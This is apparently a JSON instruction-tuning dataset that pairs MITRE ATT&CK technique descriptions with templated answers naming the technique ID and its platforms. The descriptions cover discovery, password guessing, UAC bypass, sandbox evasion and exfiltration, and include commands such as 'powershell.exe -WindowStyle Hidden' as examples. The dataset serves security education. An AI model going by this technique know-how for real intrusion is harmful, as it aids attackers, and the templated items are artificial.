    "instruction": "What are the platforms that are related to the following technique description: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Information Discovery (T1082);\nTechnique System Information Discovery (T1082) is applicable to platforms: Linux,  Network,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, IaaS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
      "answer": "The provided description is related to MITRE technique System Information Discovery (T1082);\nTechnique System Information Discovery (T1082) is applicable to platforms: Linux,  Network,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, IaaS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. \n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.. Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Brute Force: Password Guessing (T1110.001);\nTechnique Brute Force: Password Guessing (T1110.001) is applicable to platforms: Containers,  Google Workspace,  IaaS,  Linux,  Network,  Office 365,  SaaS,  Windows,  macOS, Azure AD;\nTherefore, the given procedure description is related to platforms: Containers,  Google Workspace,  IaaS,  Linux,  Network,  Office 365,  SaaS,  Windows,  macOS, Azure AD.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. \n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.. Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
      "answer": "The provided description is related to MITRE technique Brute Force: Password Guessing (T1110.001);\nTechnique Brute Force: Password Guessing (T1110.001) is applicable to platforms: Containers,  Google Workspace,  IaaS,  Linux,  Network,  Office 365,  SaaS,  Windows,  macOS, Azure AD;\nTherefore, the given procedure description is related to platforms: Containers,  Google Workspace,  IaaS,  Linux,  Network,  Office 365,  SaaS,  Windows,  macOS, Azure AD.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated Component Object Model objects without prompting the user through the UAC notification box. An example of this is use of Rundll32 to load a specifically crafted DLL which loads an auto-elevated Component Object Model object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.",
    "context": "",
    "output": "The provided description is related to MITRE technique Abuse Elevation Control Mechanism: Bypass User Account Control (T1548.002);\nTechnique Abuse Elevation Control Mechanism: Bypass User Account Control (T1548.002) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated Component Object Model objects without prompting the user through the UAC notification box. An example of this is use of Rundll32 to load a specifically crafted DLL which loads an auto-elevated Component Object Model object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.",
      "answer": "The provided description is related to MITRE technique Abuse Elevation Control Mechanism: Bypass User Account Control (T1548.002);\nTechnique Abuse Elevation Control Mechanism: Bypass User Account Control (T1548.002) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
    "context": "",
    "output": "The provided description is related to MITRE technique Application Layer Protocol: Web Protocols (T1071.001);\nTechnique Application Layer Protocol: Web Protocols (T1071.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
      "answer": "The provided description is related to MITRE technique Application Layer Protocol: Web Protocols (T1071.001);\nTechnique Application Layer Protocol: Web Protocols (T1071.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Query Registry (T1012);\nTechnique Query Registry (T1012) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
      "answer": "The provided description is related to MITRE technique Query Registry (T1012);\nTechnique Query Registry (T1012) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \n\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.\n\nOn macOS, the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.\n\nSimilarly, on Windows there are a variety of features in scripting languages, such as PowerShell, Jscript, and Visual Basic to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>.\n\nIn addition, Windows supports the `CreateDesktop()` API that can create a hidden desktop window with its own corresponding <code>explorer.exe</code> process.  All applications running on the hidden desktop window, such as a hidden VNC (hVNC) session, will be invisible to other desktops windows.",
    "context": "",
    "output": "The provided description is related to MITRE technique Hide Artifacts: Hidden Window (T1564.003);\nTechnique Hide Artifacts: Hidden Window (T1564.003) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \n\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.\n\nOn macOS, the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.\n\nSimilarly, on Windows there are a variety of features in scripting languages, such as PowerShell, Jscript, and Visual Basic to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>.\n\nIn addition, Windows supports the `CreateDesktop()` API that can create a hidden desktop window with its own corresponding <code>explorer.exe</code> process.  All applications running on the hidden desktop window, such as a hidden VNC (hVNC) session, will be invisible to other desktops windows.",
      "answer": "The provided description is related to MITRE technique Hide Artifacts: Hidden Window (T1564.003);\nTechnique Hide Artifacts: Hidden Window (T1564.003) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.",
    "context": "",
    "output": "The provided description is related to MITRE technique File and Directory Discovery (T1083);\nTechnique File and Directory Discovery (T1083) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.",
      "answer": "The provided description is related to MITRE technique File and Directory Discovery (T1083);\nTechnique File and Directory Discovery (T1083) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code. \n\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.",
    "context": "",
    "output": "The provided description is related to MITRE technique Obfuscated Files or Information: Software Packing (T1027.002);\nTechnique Obfuscated Files or Information: Software Packing (T1027.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code. \n\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.",
      "answer": "The provided description is related to MITRE technique Obfuscated Files or Information: Software Packing (T1027.002);\nTechnique Obfuscated Files or Information: Software Packing (T1027.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.",
    "context": "",
    "output": "The provided description is related to MITRE technique Modify Registry (T1112);\nTechnique Modify Registry (T1112) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.",
      "answer": "The provided description is related to MITRE technique Modify Registry (T1112);\nTechnique Modify Registry (T1112) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through Drive-by Compromise and Spearphishing Link. Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through Phishing. Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Exploitation for Client Execution (T1203);\nTechnique Exploitation for Client Execution (T1203) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through Drive-by Compromise and Spearphishing Link. Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through Phishing. Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",
      "answer": "The provided description is related to MITRE technique Exploitation for Client Execution (T1203);\nTechnique Exploitation for Client Execution (T1203) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.\n\nAdversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: Scheduled Task/Job). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled Multi-Stage Channels to avoid analysis and scrutiny.\n\nBenign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as Pings, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments. Another variation, commonly referred to as API hammering, involves making various calls to Native API functions in order to delay execution (while also potentially overloading analysis environments with junk data).\n\nAdversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.",
    "context": "",
    "output": "The provided description is related to MITRE technique Virtualization/Sandbox Evasion: Time Based Evasion (T1497.003);\nTechnique Virtualization/Sandbox Evasion: Time Based Evasion (T1497.003) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.\n\nAdversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: Scheduled Task/Job). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled Multi-Stage Channels to avoid analysis and scrutiny.\n\nBenign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as Pings, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments. Another variation, commonly referred to as API hammering, involves making various calls to Native API functions in order to delay execution (while also potentially overloading analysis environments with junk data).\n\nAdversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.",
      "answer": "The provided description is related to MITRE technique Virtualization/Sandbox Evasion: Time Based Evasion (T1497.003);\nTechnique Virtualization/Sandbox Evasion: Time Based Evasion (T1497.003) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
    "context": "",
    "output": "The provided description is related to MITRE technique Command and Scripting Interpreter: Windows Command Shell (T1059.003);\nTechnique Command and Scripting Interpreter: Windows Command Shell (T1059.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
      "answer": "The provided description is related to MITRE technique Command and Scripting Interpreter: Windows Command Shell (T1059.003);\nTechnique Command and Scripting Interpreter: Windows Command Shell (T1059.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. \n\nWhen automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel and Exfiltration Over Alternative Protocol.",
    "context": "",
    "output": "The provided description is related to MITRE technique Automated Exfiltration (T1020);\nTechnique Automated Exfiltration (T1020) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
